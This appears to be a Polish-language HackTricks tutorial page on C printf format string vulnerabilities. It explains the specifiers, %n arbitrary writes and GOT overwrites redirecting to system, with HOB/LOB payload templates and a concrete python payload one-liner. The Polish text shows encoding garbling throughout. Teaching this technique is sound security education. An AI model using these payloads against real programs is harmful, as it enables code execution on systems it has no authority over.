# CiÄ…gi formatujÄ…ce

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmujÄ…cej siÄ™ cyberbezpieczeÅ„stwem**? Chcesz zobaczyÄ‡, jak Twoja **firma jest reklamowana na HackTricks**? lub chcesz mieÄ‡ dostÄ™p do **najnowszej wersji PEASS lub pobraÄ‡ HackTricks w formacie PDF**? SprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **DoÅ‚Ä…cz do** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Podstawowe informacje

W jÄ™zyku C **`printf`** to funkcja, ktÃ³ra moÅ¼e byÄ‡ uÅ¼ywana do **wyÅ›wietlania** ciÄ…gÃ³w znakÃ³w. **Pierwszym parametrem**, ktÃ³rego oczekuje ta funkcja, jest **surowy tekst z formatowaniem**. **NastÄ™pne parametry** oczekiwane sÄ… jako **wartoÅ›ci** do **podstawienia** w miejsce **formatowania** z surowego tekstu.

PodatnoÅ›Ä‡ pojawia siÄ™, gdy **tekst atakujÄ…cego jest umieszczany jako pierwszy argument** tej funkcji. AtakujÄ…cy bÄ™dzie w stanie stworzyÄ‡ **specjalne dane wykorzystujÄ…c** moÅ¼liwoÅ›ci **ciÄ…gÃ³w formatujÄ…cych printf**, aby **zapisaÄ‡ dowolne dane pod dowolnym adresem**. DziÄ™ki temu bÄ™dzie mÃ³gÅ‚ **wykonaÄ‡ dowolny kod**. 

Formatery:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **zapisuje** liczbÄ™ zapisanych bajtÃ³w pod wskazanym adresem. ZapisujÄ…c tyle bajtÃ³w, ile wynosi liczba szesnastkowa, ktÃ³rÄ… **chcemy zapisaÄ‡**, moÅ¼emy **zapisaÄ‡ dowolne dane**.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### **Przebieg ataku**

Jak juÅ¼ wyjaÅ›niono, ta podatnoÅ›Ä‡ pozwala na **zapisanie dowolnej wartoÅ›ci pod dowolnym adresem (arbitrary write).**

Celem bÄ™dzie **nadpisanie** **adresu** **funkcji** w tabeli **GOT**, ktÃ³ra zostanie pÃ³Åºniej wywoÅ‚ana. Idealnie byÅ‚oby ustawiÄ‡ **adres na shellcode** znajdujÄ…cy siÄ™ w sekcji wykonywalnej, ale jest bardzo prawdopodobne, Å¼e nie bÄ™dziesz w stanie zapisaÄ‡ shellcode'a w sekcji wykonywalnej.\
Dlatego innÄ… opcjÄ… jest **nadpisanie funkcji**, ktÃ³ra **przyjmuje** swoje **argumenty** od **uÅ¼ytkownika** i **skierowanie** jej do funkcji **`system`**.

Aby zapisaÄ‡ adres, zazwyczaj wykonuje siÄ™ 2 kroki: Najpierw zapisuje siÄ™ 2 bajty adresu, a nastÄ™pnie pozostaÅ‚e 2. Do tego uÅ¼ywa siÄ™ **`$hn`.**

**HOB** odnosi siÄ™ do 2 starszych bajtÃ³w adresu\
**LOB** odnosi siÄ™ do 2 mÅ‚odszych bajtÃ³w adresu

Zatem, ze wzglÄ™du na sposÃ³b dziaÅ‚ania formatu Å‚aÅ„cucha znakÃ³w, musisz **najpierw zapisaÄ‡ mniejszy** z \[HOB, LOB] a nastÄ™pnie drugi.

JeÅ›li HOB < LOB\
`[adres+2][adres]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

JeÅ›li HOB > LOB\
`[adres+2][adres]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

## Szablon Pwntools

MoÅ¼esz znaleÅºÄ‡ szablon do przygotowania ataku na tego rodzaju podatnoÅ›Ä‡ w:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmujÄ…cej siÄ™ cyberbezpieczeÅ„stwem**? Chcesz zobaczyÄ‡ reklamÄ™ swojej **firmy na HackTricks**? lub chcesz mieÄ‡ dostÄ™p do **najnowszej wersji PEASS lub pobraÄ‡ HackTricks w formacie PDF**? SprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **DoÅ‚Ä…cz do** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
